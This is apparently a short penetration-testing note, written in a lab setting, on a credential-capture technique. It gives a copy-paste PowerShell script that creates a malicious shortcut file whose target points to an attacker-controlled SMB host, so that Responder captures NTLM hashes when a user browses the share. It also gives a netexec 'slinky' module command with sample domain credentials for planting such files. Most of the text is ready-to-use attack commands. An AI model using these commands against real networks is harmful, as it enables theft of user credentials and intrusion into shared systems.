Placing a malicious file in a shared folder can lead to some great results.

We can use elevated powershell to do this:

![[Pasted image 20240829115125.png]]

Text to copy-paste from:

```
$objShell = New-Object -ComObject WScript.shell 
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\192.168.138.149\@test.png" 
$lnk.WindowStyle = 1 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3" $lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()
```

What we're doing is we are taking this and we're generating a file and that is getting placed in a file share. And what happens is if responder is up, and that file is triggered, we can capture a hash. Its a watering hole attack.

![[Pasted image 20240829115447.png]]

You can also use a tool called netexec, which is a sister to crackmapexec and you can run this command in the /opt/NetExec folder:

```
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149
```

Just replace the IP, username, password, DC with yours. The server IP is your attacker IP address. Thats all :)